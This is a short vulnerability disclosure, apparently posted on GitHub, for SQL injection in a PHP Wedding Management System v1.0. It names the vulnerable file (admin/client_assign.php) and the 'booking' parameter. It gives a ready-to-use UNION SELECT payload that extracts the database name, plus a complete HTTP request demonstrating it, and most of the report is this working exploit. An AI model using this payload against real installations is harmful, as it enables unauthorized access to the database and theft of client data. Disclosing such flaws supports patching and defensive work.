# Wedding Management System v1.0 by codeastr.com has SQL injection

vendors: https://codeastro.com/wedding-management-system-in-php-with-source-code/

Vulnerability File: \admin\client_assign.php

Vulnerability location: /Wedding-Management/admin/client_assign.php?booking=, booking

[+] Payload: booking=-31%20union%20select%201,2,3,4,5,database(),7,8--+

dbname = dbwedding

```sql
GET /Wedding-Management/admin/client_assign.php?booking=-31%20union%20select%201,2,3,4,5,database(),7,8--+&user_id=31 HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/167982690-aea66178-cca8-4304-b075-4314098692d6.png)

![image](https://user-images.githubusercontent.com/54017627/167982624-601f0505-da3e-433b-a655-3c1cecaecb2e.png)
